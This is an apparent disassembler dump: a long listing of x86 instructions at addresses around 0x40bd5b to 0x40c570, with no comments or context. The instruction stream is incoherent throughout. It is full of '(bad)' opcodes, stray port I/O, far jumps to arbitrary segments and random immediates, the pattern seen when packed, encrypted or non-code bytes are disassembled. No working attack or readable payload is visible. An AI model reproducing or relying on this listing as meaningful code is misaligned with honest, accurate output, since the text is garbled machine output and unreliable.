  40bd5b:	out    dx,eax
  40bd5c:	mov    ah,0xf7
  40bd5e:	in     al,0xb7
  40bd60:	mov    dh,0xf0
  40bd62:	mov    esp,0xe7d5fff5
  40bd67:	rcr    esp,0xf4
  40bd6a:	rcl    ecx,cl
  40bd6c:	lds    eax,FWORD PTR [edx]
  40bd6e:	jmp    0xe00b:0xcfed0ff8
  40bd75:	mov    ebp,0xc8c7d6c4
  40bd7a:	jmp    0x40bd49
  40bd7c:	retf   0xf5ce
  40bd7f:	mov    cl,0xc8
  40bd81:	jmp    0xbe1c8d52
  40bd86:	add    esi,edx
  40bd88:	hlt    
  40bd89:	aam    0xf4
  40bd8b:	add    BYTE PTR [eax-0x3b3b2a0b],bh
  40bd91:	call   0xaf3fb75a
  40bd96:	jmp    0xb7ac:0xb0eca8a5
  40bd9d:	in     al,0xb6
  40bd9f:	(bad)  
  40bda0:	std    
  40bda1:	repnz int3 
  40bda3:	cld    
  40bda4:	(bad)  
  40bda5:	in     al,dx
  40bda6:	mov    edx,0xd7d2c6e3
  40bdab:	xlat   BYTE PTR ds:[ebx]
  40bdac:	fdiv   st,st(5)
  40bdae:	stc    
  40bdaf:	pop    es
  40bdb0:	fiadd  DWORD PTR [esi]
  40bdb2:	(bad)  
  40bdb4:	add    cl,al
  40bdb6:	out    dx,eax
  40bdb7:	repnz loop 0x40bda3
  40bdba:	mov    dh,0xe1
  40bdbc:	int    0xb3
  40bdbe:	loopne 0x40bdb9
  40bdc0:	in     al,0xc4
  40bdc2:	out    dx,al
  40bdc3:	shl    eax,1
  40bdc5:	ret    0xe1f0
  40bdc8:	push   es
  40bdc9:	loop   0x40bd9b
  40bdcb:	loop   0x40bd8d
  40bdcd:	or     dl,ah
  40bdcf:	aam    0xcf
  40bdd1:	aad    0xe
  40bdd3:	adc    cl,dh
  40bdd5:	out    dx,al
  40bdd6:	jecxz  0x40bda7
  40bdd8:	mov    dl,0xd2
  40bdda:	ror    ah,cl
  40bddc:	idiv   al
  40bdde:	not    ecx
  40bde0:	mov    ah,0xdf
  40bde2:	repnz shl BYTE PTR [eax-0x1c0217fd],cl
  40bde9:	(bad)
  40bdec:	rcr    al,1
  40bdee:	loope  0x40bdb1
  40bdf0:	jmp    0xfb1bb8fa
  40bdf5:	jecxz  0x40bdd8
  40bdf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdf8:	mov    bh,0xc8
  40bdfa:	mov    cl,0xe9
  40bdfc:	cmc    
  40bdfd:	aad    0xf1
  40bdff:	mov    ecx,0xddb8ebd5
  40be04:	out    dx,al
  40be05:	rcl    ebp,0x6
  40be08:	idiv   edx
  40be0a:	test   bh,0xd2
  40be0d:	push   es
  40be0e:	ror    bl,1
  40be10:	in     eax,0xb
  40be12:	push   edx
  40be14:	or     eax,0xc6afcecf
  40be19:	not    cl
  40be1b:	lods   al,BYTE PTR ds:[esi]
  40be1c:	(bad)  
  40be1e:	int    0xff
  40be20:	cmc    
  40be21:	fidivr DWORD PTR [edx-0x1d174105]
  40be27:	out    dx,al
  40be28:	(bad)  
  40be2a:	hlt    
  40be2b:	(bad)  
  40be2c:	jmp    0xe70a:0xe9e701e0
  40be33:	sti    
  40be34:	in     al,0xd2
  40be36:	test   eax,0xb0bddec1
  40be3b:	mov    bh,0xb0
  40be3d:	mov    ch,0xff
  40be3f:	(bad)  
  40be40:	mov    al,0xee
  40be42:	fiadd  WORD PTR [edx]
  40be44:	mov    edi,0xfed3cfdc
  40be49:	pop    es
  40be4a:	mov    esp,0x5d0fcd3
  40be4f:	(bad)  
  40be51:	add    bl,ah
  40be53:	(bad)  
  40be54:	fdivr  st(1),st
  40be56:	stos   BYTE PTR es:[edi],al
  40be57:	(bad)  
  40be58:	call   0xd535b647
  40be5d:	call   0xee0c9931
  40be62:	(bad)  
  40be64:	test   edx,0xfab8ecdd
  40be6a:	std    
  40be6b:	rol    bl,0xde
  40be6e:	cmc    
  40be6f:	clc    
  40be70:	fisttp WORD PTR [ecx]
  40be72:	pmulhuw mm1,mm3
  40be75:	stos   DWORD PTR es:[edi],eax
  40be76:	int3   
  40be77:	jmp    0xcdb6:0xc7dbcfaf
  40be7e:	aam    0xeb
  40be80:	(bad)
  40be83:	in     al,dx
  40be84:	(bad)  
  40be85:	mov    esi,0xf0f9f4e7
  40be8a:	loopne 0x40be5f
  40be8c:	jmp    0xcd02:0xcf07e2c5
  40be93:	pop    es
  40be94:	std    
  40be95:	retf   0xc5c6
  40be98:	in     eax,dx
  40be99:	mov    esp,0xcecfe5bc
  40be9e:	fcmove st,st(6)
  40bea0:	(bad)  
  40bea1:	fdivr  st(7),st
  40bea3:	fstp   TBYTE PTR [eax-0x2430291e]
  40bea9:	cli    
  40beaa:	repz repnz dec bl
  40beae:	ret    0x8e0
  40beb1:	cmc    
  40beb2:	leave  
  40beb3:	(bad)
  40beb6:	int3   
  40beb7:	in     eax,dx
  40beb8:	les    ebp,FWORD PTR [ebx+esi*4-0x2c480820]
  40bebf:	mov    bh,0xc6
  40bec1:	(bad)  
  40bec2:	fnstsw WORD PTR [edx-0x19401011]
  40bec8:	icebp  
  40bec9:	faddp  st(0),st
  40becb:	or     eax,ebp
  40becd:	stc    
  40bece:	ror    BYTE PTR [ecx],1
  40bed0:	fsubp  st(6),st
  40bed2:	faddp  st(5),st
  40bed4:	or     eax,0xebc5eec7
  40bed9:	out    0xe7,eax
  40bedb:	mov    ah,0xa8
  40bedd:	out    dx,al
  40bede:	(bad)  
  40bedf:	lock lods al,BYTE PTR ds:[esi]
  40bee1:	shl    esp,1
  40bee3:	mov    ebp,0xc2d200db
  40bee8:	in     eax,dx
  40bee9:	rcr    ebx,0xf2
  40beec:	mov    BYTE PTR [eax],0xca
  40beef:	fsubp  st(6),st
  40bef1:	in     al,dx
  40bef2:	jecxz  0x40befb
  40bef4:	add    bh,ch
  40bef6:	lock mov edi,0xcee8e0b0
  40befc:	jmp    0xdb2cb5dc
  40bf01:	cli    
  40bf02:	in     al,0xdc
  40bf04:	cmc    
  40bf05:	add    dh,cl
  40bf07:	mov    esp,0xd9dcfefb
  40bf0c:	fdivrp st(6),st
  40bf0e:	or     cl,BYTE PTR [esi]
  40bf10:	jmp    0xc8cc:0xce6f90c
  40bf17:	in     eax,0xb2
  40bf19:	icebp  
  40bf1a:	fcmovne st,st(4)
  40bf1c:	lock hlt 
  40bf1e:	into   
  40bf1f:	(bad)  
  40bf21:	(bad)  
  40bf22:	fldlg2 
  40bf24:	ret    0x1e8
  40bf27:	stc    
  40bf28:	cmc    
  40bf29:	push   es
  40bf2a:	add    al,BYTE PTR [ebx*8+0x803dcfa]
  40bf31:	iret   
  40bf32:	in     eax,dx
  40bf33:	(bad)  
  40bf34:	fsubr  st(3),st
  40bf36:	into   
  40bf37:	imul   BYTE PTR [eax-0x494c0415]
  40bf3d:	shl    DWORD PTR [edi-0x37210830],cl
  40bf43:	into   
  40bf44:	fld    st(2)
  40bf46:	fcmovnu st,st(0)
  40bf48:	lock imul bl
  40bf4b:	push   es
  40bf4c:	test   bl,0xc1
  40bf4f:	push   es
  40bf50:	fstp   st(3)
  40bf52:	call   0xad148c65
  40bf57:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf59:	rcl    esi,cl
  40bf5b:	mov    cl,0xeb
  40bf5d:	(bad)  
  40bf5e:	cli    
  40bf5f:	jmp    0x40bf56
  40bf61:	fdivp  st(2),st
  40bf63:	jmp    0xd3be:0xe6ccbfc9
  40bf6a:	clc    
  40bf6b:	aad    0x7
  40bf6d:	call   0xce267c7c
  40bf72:	cli    
  40bf73:	add    al,cl
  40bf75:	lods   eax,DWORD PTR ds:[esi]
  40bf76:	into   
  40bf77:	lock icebp 
  40bf79:	(bad)  [esi-0x29502a39]
  40bf7f:	enter  0xdac8,0xf7
  40bf83:	cld    
  40bf84:	(bad)  
  40bf86:	cli    
  40bf87:	aad    0xde
  40bf89:	fiadd  DWORD PTR [ebx]
  40bf8b:	or     eax,DWORD PTR [ebx]
  40bf8d:	std    
  40bf8e:	mov    esi,0xdcbfc01
  40bf93:	out    dx,al
  40bf94:	clc    
  40bf95:	leave  
  40bf96:	call   0xc1efa952
  40bf9b:	out    0xcb,al
  40bf9d:	in     al,dx
  40bf9e:	mov    edx,0x3d4edb7
  40bfa3:	aam    0x2
  40bfa5:	iret   
  40bfa6:	ret    
  40bfa7:	(bad)  
  40bfa8:	std    
  40bfa9:	lock mov esp,0xfc02eac0
  40bfaf:	out    0xea,al
  40bfb1:	mov    DWORD PTR [esi],0xc6c3e2f8
  40bfb7:	fucomp st(5)
  40bfb9:	mov    bh,0xd5
  40bfbb:	aam    0xe0
  40bfbd:	xlat   BYTE PTR ds:[ebx]
  40bfbe:	test   ah,0xac
  40bfc1:	in     al,dx
  40bfc2:	hlt    
  40bfc3:	mov    eax,0xbefadbe9
  40bfc8:	add    BYTE PTR [ebx-0x40092e3a],bh
  40bfce:	or     esi,ebp
  40bfd0:	dec    BYTE PTR [edx]
  40bfd2:	cld    
  40bfd3:	ror    edx,cl
  40bfd5:	rcl    cl,0xb0
  40bfd8:	int3   
  40bfd9:	int    0xf6
  40bfdb:	out    dx,al
  40bfdc:	sti    
  40bfdd:	mov    ebx,0xcdedf4ee
  40bfe2:	call   0xf640b9d3
  40bfe7:	fdiv   st(3),st
  40bfe9:	pop    es
  40bfea:	ror    bl,1
  40bfec:	fiadd  DWORD PTR [eax]
  40bfee:	cmc    
  40bfef:	(bad)  
  40bff1:	add    dh,ah
  40bff3:	leave  
  40bff4:	(bad)  
  40bff5:	in     al,dx
  40bff6:	mov    esp,0xf5e1e7ec
  40bffb:	retf   0xc5cc
  40bffe:	out    0xbf,al
  40c000:	stc    
  40c001:	sti    
  40c002:	in     eax,dx
  40c003:	leave  
  40c004:	std    
  40c005:	add    edi,DWORD PTR [ebp-0xd0a3f39]
  40c00b:	pop    es
  40c00c:	shl    bh,cl
  40c00e:	shl    ecx,0xc4
  40c011:	int    0xc2
  40c013:	fisttp WORD PTR [esi]
  40c015:	fsubr  st(4),st
  40c017:	rcl    ecx,cl
  40c019:	mov    al,0xf6
  40c01b:	shr    edi,0xf4
  40c01e:	icebp  
  40c01f:	repz rcr ch,1
  40c022:	fdiv   st,st(5)
  40c024:	icebp  
  40c025:	(bad)  
  40c027:	mov    eax,0xad6bbfa
  40c02c:	add    DWORD PTR [ebx],ecx
  40c02e:	retf   
  40c02f:	or     bl,ah
  40c031:	add    al,0xdb
  40c033:	loopne 0x40c035
  40c035:	out    0xe5,eax
  40c037:	mov    bh,0xe0
  40c039:	lods   al,BYTE PTR ds:[esi]
  40c03a:	mov    esp,0xefc6efb3
  40c03f:	out    dx,al
  40c040:	(bad)  
  40c042:	neg    dl
  40c044:	aad    0xed
  40c046:	in     al,dx
  40c047:	fcomp  st(0)
  40c049:	in     eax,dx
  40c04a:	repnz add bl,ch
  40c04d:	retf   
  40c04e:	in     eax,0xe8
  40c050:	pminsw mm0,QWORD PTR [esi]
  40c053:	add    edi,esp
  40c055:	shr    eax,1
  40c057:	ffree  st(1)
  40c059:	mov    ah,0xc1
  40c05c:	neg    bl
  40c05e:	call   0x435972e
  40c063:	clc    
  40c064:	ret    
  40c065:	mov    ebp,0xd0ee07dd
  40c06a:	loopne 0x40c069
  40c06c:	jmp    0x40c053
  40c06e:	xlat   BYTE PTR ds:[ebx]
  40c06f:	fild   WORD PTR [edx+eiz*8]
  40c072:	jecxz  0x40c074
  40c074:	stc    
  40c075:	shr    bl,cl
  40c077:	bnd lock jmp 0x40c06b
  40c07b:	into   
  40c07c:	mov    cl,0xd9
  40c07e:	hlt    
  40c07f:	idiv   cl
  40c081:	fnstsw WORD PTR [ebp-0x27073c17]
  40c087:	std    
  40c088:	rcl    al,1
  40c08a:	shl    bl,1
  40c08c:	fdivrp st(1),st
  40c08e:	jmp    0x143fc78b
  40c093:	(bad)  
  40c095:	shl    bh,cl
  40c097:	mov    bl,0xb7
  40c099:	mov    dl,0xf0
  40c09b:	jecxz  0x40c07f
  40c09d:	mov    ecx,0xcef6ebb1
  40c0a2:	aad    0xd1
  40c0a4:	(bad)  
  40c0a5:	(bad)  
  40c0a6:	fcmovnb st,st(0)
  40c0a8:	fdiv   st,st(0)
  40c0aa:	div    cl
  40c0ac:	pop    es
  40c0ad:	ret    0x604
  40c0b0:	(bad)  
  40c0b2:	aam    0xcf
  40c0b4:	in     al,dx
  40c0b5:	(bad)  
  40c0b7:	loopne 0x40c07d
  40c0b9:	jmp    0x40c0a9
  40c0bb:	iret   
  40c0bc:	jmp    0x40c0ab
  40c0be:	sar    dl,1
  40c0c0:	fcmovne st,st(7)
  40c0c2:	int    0xf5
  40c0c4:	lock loop 0x40c09a
  40c0c7:	xlat   BYTE PTR ds:[ebx]
  40c0c8:	add    esi,ecx
  40c0ca:	add    ecx,DWORD PTR [ebx]
  40c0cc:	add    eax,0xc9e9d801
  40c0d1:	add    eax,0xe1cacde3
  40c0d6:	loopne 0x40c0b5
  40c0d8:	int    0xe6
  40c0da:	div    DWORD PTR [edi-0x34113514]
  40c0e0:	mov    esi,0xf6bdf4d9
  40c0e5:	icebp  
  40c0e6:	ret    
  40c0e7:	mov    edi,0xdec500f5
  40c0ec:	fcomp  st(2)
  40c0ee:	fmul   QWORD PTR [ecx]
  40c0f0:	not    ch
  40c0f2:	into   
  40c0f3:	sti    
  40c0f4:	or     bh,bl
  40c0f6:	(bad)
  40c0f9:	jmp    0xe9b1:0xdacbc1ee
  40c100:	fidivr DWORD PTR [eax-0x212a3243]
  40c106:	cld    
  40c107:	fsubrp st(7),st
  40c109:	mov    esp,0x3dbf9d5
  40c10e:	loopne 0x40c0f8
  40c110:	std    
  40c111:	push   es
  40c112:	or     eax,0xf1df06cd
  40c117:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c119:	scas   eax,DWORD PTR es:[edi]
  40c11a:	lods   al,BYTE PTR ds:[esi]
  40c11b:	repz rcl edx,cl
  40c11e:	fucomip st,st(1)
  40c120:	in     al,dx
  40c121:	aad    0xf2
  40c123:	retf   
  40c124:	call   0x335ba08
  40c129:	fdivr  st,st(7)
  40c12b:	inc    ch
  40c12d:	test   DWORD PTR [edi],0xfa08e0ff
  40c133:	pop    es
  40c134:	fcomip st,st(3)
  40c136:	ret    
  40c137:	(bad)  
  40c138:	scas   al,BYTE PTR es:[edi]
  40c139:	jmp    0xf4ca:0xb9cabbac
  40c140:	fcmovbe st,st(1)
  40c142:	mov    edi,0xdbedd8ed
  40c147:	(bad)  
  40c148:	sar    DWORD PTR [ebp+ebx*8-0x1aff253a],cl
  40c14f:	iret   
  40c150:	retf   0xcdea
  40c153:	in     eax,0xfa
  40c155:	shr    DWORD PTR [ecx-0x18164820],cl
  40c15b:	call   0xccf9aa13
  40c160:	leave  
  40c161:	faddp  st(4),st
  40c163:	jmp    0xdf237e23
  40c168:	in     al,dx
  40c169:	out    0x3,eax
  40c16b:	mov    DWORD PTR [ecx],0x30bdde6
  40c171:	pop    es
  40c172:	call   0xdeefa546
  40c177:	jmp    0x40c135
  40c179:	int    0xae
  40c17b:	mov    dh,0xeb
  40c17d:	mov    al,0xd8
  40c17f:	mov    edx,0xecbfd7f8
  40c184:	stc    
  40c185:	in     al,dx
  40c186:	add    ch,bh
  40c188:	repz xlat BYTE PTR ds:[ebx]
  40c18a:	loope  0x40c145
  40c18c:	in     eax,0xf7
  40c18e:	cli    
  40c18f:	cld    
  40c190:	add    eax,0xcbe9cdd4
  40c195:	jmp    0xe2218a6b
  40c19a:	ret    0xd9bb
  40c19d:	mov    al,0xd0
  40c19f:	lock mov ebx,0xf4d2dbef
  40c1a5:	add    bl,ah
  40c1a7:	shl    ah,0xf7
  40c1aa:	(bad)  
  40c1ab:	repz lock rol BYTE PTR [esp+eax*1],1
  40c1b0:	or     eax,0xc8e2fff9
  40c1b5:	ret    0xdef7
  40c1b8:	out    0xd4,eax
  40c1ba:	(bad)  
  40c1bb:	int3   
  40c1bc:	sti    
  40c1bd:	retf   
  40c1be:	in     eax,0xc9
  40c1c0:	mov    edx,0xecf5b9f0
  40c1c5:	mov    esp,0xf0fe0600
  40c1ca:	(bad)  
  40c1cb:	jmp    0xfdd:0xdbc5dbc7
  40c1d2:	(bad)  
  40c1d3:	jmp    0xf0f984a6
  40c1d8:	in     eax,0xf6
  40c1da:	retf   
  40c1db:	call   0xb8388ed1
  40c1e0:	mov    ch,0xde
  40c1e2:	(bad)  
  40c1e4:	out    dx,al
  40c1e5:	mov    ebx,0xdfbcdcf8
  40c1ea:	(bad)  
  40c1eb:	lock mov esp,0xe03df0a
  40c1f1:	jmp    0x40c1d2
  40c1f3:	adc    eax,DWORD PTR [esi+ebp*8]
  40c1f6:	jmp    0x40c1aa
  40c1f8:	jmp    0x40c1bb
  40c1fa:	in     al,0xcf
  40c1fc:	rcl    dl,0xb1
  40c1ff:	out    0xd6,al
  40c201:	int3   
  40c202:	jmp    0xdbc2:0xd4f8e9e3
  40c209:	add    esi,eax
  40c20b:	std    
  40c20c:	out    0xf7,eax
  40c20e:	jmp    0xca4b9ed9
  40c213:	fdiv   st(0),st
  40c215:	jmp    0xad318804
  40c21a:	scas   al,BYTE PTR es:[edi]
  40c21b:	shl    bh,0xb7
  40c21e:	loopne 0x40c21a
  40c220:	jmp    0x40c1f6
  40c222:	in     al,0xd1
  40c224:	fstp   st(3)
  40c226:	out    0xec,eax
  40c228:	(bad)  
  40c229:	fdiv   st(6),st
  40c22b:	aam    0xf8
  40c22d:	loope  0x40c21e
  40c22f:	std    
  40c230:	or     ecx,ebx
  40c232:	int3   
  40c233:	fsubp  st(3),st
  40c235:	mov    bl,0xef
  40c237:	in     al,dx
  40c238:	ret    
  40c239:	in     al,dx
  40c23a:	shl    BYTE PTR [edi-0x463a263c],0xb4
  40c241:	in     eax,0xd6
  40c243:	fdivr  QWORD PTR [esi+ecx*8-0x26274346]
  40c24a:	xlat   BYTE PTR ds:[ebx]
  40c24b:	(bad)  
  40c24c:	(bad)  
  40c24e:	fcmovbe st,st(5)
  40c250:	out    0xe2,eax
  40c252:	out    0xfd,eax
  40c254:	call   0xd7329036
  40c259:	mov    ebp,0xafd4b1d1
  40c25e:	mov    ch,0xb0
  40c260:	shl    BYTE PTR [esi-0x3d310e2d],1
  40c266:	icebp  
  40c267:	(bad)  
  40c268:	(bad)  
  40c269:	fadd   DWORD PTR [ebx]
  40c26b:	add    ebp,edx
  40c26d:	retf   0xd7fe
  40c270:	in     eax,0xe5
  40c272:	jmp    0xf2289140
  40c277:	enter  0xf7ca,0xe2
  40c27b:	out    dx,al
  40c27c:	xlat   BYTE PTR ds:[ebx]
  40c27d:	mov    dh,0xd1
  40c27f:	mov    cl,0xc6
  40c281:	mov    esi,0xe8d8d4b9
  40c286:	jecxz  0x40c265
  40c288:	loope  0x40c26d
  40c28a:	aad    0xc2
  40c28c:	out    0xff,al
  40c28e:	shl    edx,0xd4
  40c291:	in     eax,0xd4
  40c293:	sti    
  40c294:	in     eax,dx
  40c295:	mov    cl,0xc6
  40c297:	enter  0xccf3,0xb1
  40c29b:	out    dx,eax
  40c29c:	(bad)  
  40c29d:	aad    0xf7
  40c29f:	aam    0xed
  40c2a1:	fxch   st(4)
  40c2a3:	in     al,dx
  40c2a4:	ror    ch,1
  40c2a6:	stc    
  40c2a7:	rcl    al,cl
  40c2a9:	cld    
  40c2aa:	shl    edx,cl
  40c2ac:	or     ebp,ecx
  40c2ae:	fcmovnu st,st(3)
  40c2b0:	mov    DWORD PTR ds:0xa9f1fae5,0xbdc9eec0
  40c2ba:	shl    ecx,cl
  40c2bc:	jmp    0xfcb4:0xcfbbedd2
  40c2c3:	lock aad 0xe0
  40c2c6:	std    
  40c2c7:	mul    esi
  40c2c9:	lock ret 0xe4fb
  40c2cd:	add    eax,0xdefdf8e7
  40c2d2:	fild   WORD PTR [eax]
  40c2d4:	call   0xd72076b2
  40c2d9:	lods   al,BYTE PTR ds:[esi]
  40c2da:	shl    dl,0xee
  40c2dd:	mov    bl,0xda
  40c2df:	jmp    0xcf0d98b3
  40c2e4:	call   0xf7197ce3
  40c2e9:	int3   
  40c2ea:	mov    ebp,0xe4d8dcfd
  40c2ef:	add    al,al
  40c2f1:	out    0x0,eax
  40c2f3:	add    eax,0xc6b1e50d
  40c2f8:	scas   al,BYTE PTR es:[edi]
  40c2f9:	shl    ecx,1
  40c2fb:	int    0xcd
  40c2fd:	(bad)  
  40c2fe:	(bad)  
  40c2ff:	jmp    0xdbf38dd8
  40c304:	mov    esi,0xe2f4d5
  40c309:	stc    
  40c30a:	rcr    ebp,0xc1
  40c30d:	mov    edi,0xd5df02ef
  40c312:	or     DWORD PTR [esi],ecx
  40c314:	clc    
  40c315:	retf   0xb3c3
  40c318:	out    0xe4,eax
  40c31a:	sti    
  40c31b:	mov    dh,0xc9
  40c31d:	clc    
  40c31e:	call   0xcf0e9de2
  40c323:	xlat   BYTE PTR ds:[ebx]
  40c324:	(bad)  
  40c325:	test   ebp,0xe7c2e2f8
  40c32b:	loop   0x40c337
  40c32d:	(bad)  
  40c32e:	(bad)  
  40c330:	push   cs
  40c331:	loopne 0x40c331
  40c333:	fisttp WORD PTR [edx]
  40c335:	stos   BYTE PTR es:[edi],al
  40c336:	in     eax,0xe2
  40c338:	jmp    0x40c32d
  40c33a:	shl    DWORD PTR [esi-0x46164a1c],cl
  40c340:	stc    
  40c341:	fdivp  st(0),st
  40c343:	fmulp  st(2),st
  40c345:	rol    dl,1
  40c347:	(bad)  
  40c349:	repnz pop es
  40c34b:	loopne 0x40c353
  40c34d:	out    0xfa,al
  40c34f:	rcl    ebp,0xf4
  40c352:	jmp    0xebf7:0xb1f01201
  40c359:	in     al,0xc7
  40c35b:	test   eax,0xded2d8cf
  40c360:	int    0xdd
  40c362:	mov    ch,0xc8
  40c364:	(bad)  
  40c365:	(bad)  
  40c367:	mov    eax,0xf2c0d7d1
  40c36c:	lock ror ecx,1
  40c36f:	loop   0x40c32d
  40c371:	(bad)  
  40c372:	out    0xfb,al
  40c374:	ftst   
  40c376:	loop   0x40c368
  40c378:	scas   al,BYTE PTR es:[edi]
  40c379:	loop   0x40c365
  40c37b:	test   eax,0xbfc8f0d3
  40c380:	std    
  40c381:	lock fistp QWORD PTR [esi-0x2f450247]
  40c388:	dec    esp
  40c38a:	add    eax,0xd00bcaeb
  40c38f:	cmc    
  40c390:	retf   
  40c391:	add    esi,eax
  40c393:	into   
  40c394:	push   es
  40c395:	mov    edi,0xd5bdd0b1
  40c39a:	ret    
  40c39b:	int    0xba
  40c39d:	scas   eax,DWORD PTR es:[edi]
  40c39e:	in     al,0xb4
  40c3a0:	aad    0xd8
  40c3a2:	fild   DWORD PTR [ebx]
  40c3a4:	enter  0xf301,0x2
  40c3a8:	mov    esi,0xd503c5bb
  40c3ad:	xlat   BYTE PTR ds:[ebx]
  40c3ae:	mov    esi,0x10ac000
  40c3b3:	fdivp  st(5),st
  40c3b5:	shr    eax,cl
  40c3b7:	rcl    eax,cl
  40c3b9:	ret    
  40c3ba:	lods   eax,DWORD PTR ds:[esi]
  40c3bb:	enter  0xf6f2,0xe0
  40c3bf:	(bad)
  40c3c2:	retf   
  40c3c3:	mov    esp,0xc2d3f8b8
  40c3c8:	sar    BYTE PTR [esi-0x291b381c],0xf
  40c3cf:	fucomp st(0)
  40c3d1:	rdpru  
  40c3d4:	pop    es
  40c3d5:	in     al,0xbf
  40c3d7:	shl    dh,1
  40c3d9:	rol    ebp,1
  40c3db:	leave  
  40c3dc:	lods   al,BYTE PTR ds:[esi]
  40c3dd:	mov    ch,0xd9
  40c3df:	xlat   BYTE PTR ds:[ebx]
  40c3e0:	mov    edx,0xe8dddffb
  40c3e5:	int3   
  40c3e6:	fdivr  st,st(3)
  40c3e8:	stc    
  40c3e9:	add    ecx,ebx
  40c3eb:	ret    
  40c3ec:	ret    0xc1d1
  40c3ef:	(bad)  
  40c3f0:	in     al,0xce
  40c3f2:	push   cs
  40c3f3:	int3   
  40c3f4:	shl    BYTE PTR [ebx-0x28361b5a],0xb4
  40c3fb:	out    0xcc,eax
  40c3fd:	in     eax,0xec
  40c3ff:	(bad)  
  40c400:	sar    BYTE PTR [ebx-0xf2b0623],cl
  40c406:	add    dh,cl
  40c408:	add    esi,edi
  40c40a:	sti    
  40c40b:	add    edi,edx
  40c40d:	(bad)  
  40c40e:	cli    
  40c40f:	call   0x147ccdc
  40c414:	out    dx,al
  40c415:	stos   DWORD PTR es:[edi],eax
  40c416:	stos   BYTE PTR es:[edi],al
  40c417:	jmp    0x40c3eb
  40c419:	mul    bh
  40c41b:	jecxz  0x40c3fd
  40c41d:	enter  0xbfd5,0xcc
  40c421:	leave  
  40c422:	repnz mov cl,0xfe
  40c425:	rcr    al,cl
  40c427:	(bad)  
  40c428:	mov    ebp,0xf605bdd6
  40c42d:	(bad)  
  40c42f:	or     ch,bl
  40c431:	hlt    
  40c432:	(bad)  
  40c434:	std    
  40c435:	leave  
  40c436:	into   
  40c437:	in     al,0xf3
  40c439:	(bad)  
  40c43b:	(bad)  
  40c43c:	lods   al,BYTE PTR ds:[esi]
  40c43d:	shl    BYTE PTR [edi-0x161a440d],0xbb
  40c444:	ret    
  40c445:	iret   
  40c446:	(bad)  
  40c447:	mov    edi,0xd3fdd8f8
  40c44c:	loop   0x40c459
  40c44e:	loopne 0x40c457
  40c450:	retf   0xfdf8
  40c453:	stc    
  40c454:	fadd   st,st(7)
  40c456:	call   0xd0106d17
  40c45b:	int    0xd7
  40c45d:	loope  0x40c433
  40c45f:	out    0xf7,eax
  40c461:	sti    
  40c462:	std    
  40c463:	int3   
  40c464:	rcr    bh,1
  40c466:	call   0xfffc8162
  40c46b:	(bad)  
  40c46c:	sti    
  40c46d:	add    al,0xd8
  40c46f:	hlt    
  40c470:	leave  
  40c471:	or     bl,bl
  40c473:	loop   0x40c488
  40c475:	lock mov eax,0xeff6bddc
  40c47b:	in     eax,dx
  40c47c:	stc    
  40c47d:	(bad)  
  40c47f:	stc    
  40c480:	int    0xe9
  40c482:	retf   
  40c483:	mov    esi,0x6d1deff
  40c488:	(bad)  
  40c48a:	mov    ebp,0xc1dac1dc
  40c48f:	(bad)  
  40c491:	or     BYTE PTR [esi],al
  40c493:	adc    ah,bh
  40c495:	enter  0xafc6,0xc7
  40c499:	out    dx,eax
  40c49a:	lock retf 0xbac8
  40c49e:	retf   0xc6b7
  40c4a1:	retf   
  40c4a2:	call   0xd42d8e65
  40c4a7:	loopne 0x40c46f
  40c4a9:	fdivr  st(5),st
  40c4ab:	(bad)  
  40c4ac:	out    0xe0,eax
  40c4ae:	call   0xc845c28e
  40c4b3:	fld1   
  40c4b5:	test   eax,0xc3c5a5e0
  40c4ba:	fcmovnbe st,st(5)
  40c4bc:	ret    0xcbcf
  40c4bf:	out    0xd0,eax
  40c4c1:	leave  
  40c4c2:	out    dx,eax
  40c4c3:	hlt    
  40c4c4:	out    dx,al
  40c4c5:	leave  
  40c4c6:	shl    eax,0xce
  40c4c9:	in     al,0xff
  40c4cb:	icebp  
  40c4cc:	add    ecx,ebx
  40c4ce:	loop   0x40c4b0
  40c4d0:	push   cs
  40c4d1:	jecxz  0x40c4ac
  40c4d3:	out    0x9,eax
  40c4d5:	shr    BYTE PTR [ecx-0x2a1a115b],1
  40c4db:	ret    0xd5cf
  40c4de:	mov    ch,0xe9
  40c4e0:	fcmovnbe st,st(7)
  40c4e2:	call   eax
  40c4e4:	loope  0x40c4b3
  40c4e6:	(bad)  
  40c4e8:	bnd ret 
  40c4ea:	in     al,0x2
  40c4ec:	std    
  40c4ed:	xlat   BYTE PTR ds:[ebx]
  40c4ee:	jmp    0xe34dc1d2
  40c4f3:	in     al,dx
  40c4f4:	icebp  
  40c4f5:	ret    
  40c4f6:	int    0xd2
  40c4f8:	rcl    esi,0xb6
  40c4fb:	loop   0x40c4c2
  40c4fd:	rcl    ah,1
  40c4ff:	mov    dh,0xe4
  40c501:	fucom  st(4)
  40c503:	std    
  40c504:	cli    
  40c505:	(bad)  
  40c507:	(bad)  
  40c508:	hlt    
  40c509:	aam    0xf8
  40c50b:	aad    0xd6
  40c50d:	aad    0xe3
  40c50f:	std    
  40c510:	pop    es
  40c511:	loope  0x40c50d
  40c513:	int3   
  40c514:	add    eax,esi
  40c516:	jmp    0xf411a9cb
  40c51b:	test   eax,0xeebaf9e4
  40c520:	jmp    0x40c4d8
  40c522:	(bad)  
  40c523:	aam    0xf7
  40c525:	mov    edi,0xecd0c2ef
  40c52a:	out    0xe5,eax
  40c52c:	(bad)  
  40c52e:	loop   0x40c539
  40c530:	or     edx,ebp
  40c532:	out    dx,eax
  40c533:	(bad)  
  40c534:	jecxz  0x40c515
  40c536:	scas   al,BYTE PTR es:[edi]
  40c537:	in     eax,dx
  40c538:	icebp  
  40c539:	leave  
  40c53a:	aad    0xa9
  40c53c:	loop   0x40c527
  40c53e:	loopne 0x40c52d
  40c540:	fdivp  st(0),st
  40c542:	idiv   bl
  40c544:	idiv   ecx
  40c546:	fadd   QWORD PTR [ecx]
  40c548:	fmulp  st(5),st
  40c54a:	(bad)  
  40c54b:	repnz xlat BYTE PTR ds:[ebx]
  40c54d:	(bad)  
  40c54e:	fadd   QWORD PTR [edx]
  40c550:	out    0xc7,eax
  40c552:	fstp   st(5)
  40c554:	fmul   st(4),st
  40c556:	out    dx,al
  40c557:	mov    esp,0xe2c4aeed
  40c55c:	(bad)
  40c55f:	enter  0xc9e5,0xca
  40c563:	add    dh,bl
  40c565:	add    dl,bl
  40c567:	add    DWORD PTR [eax-0x1e340f27],edi
  40c56d:	std    
  40c56e:	out    0xef,al
  40c570:	fild   DWORD PTR ds:0xf1e609de
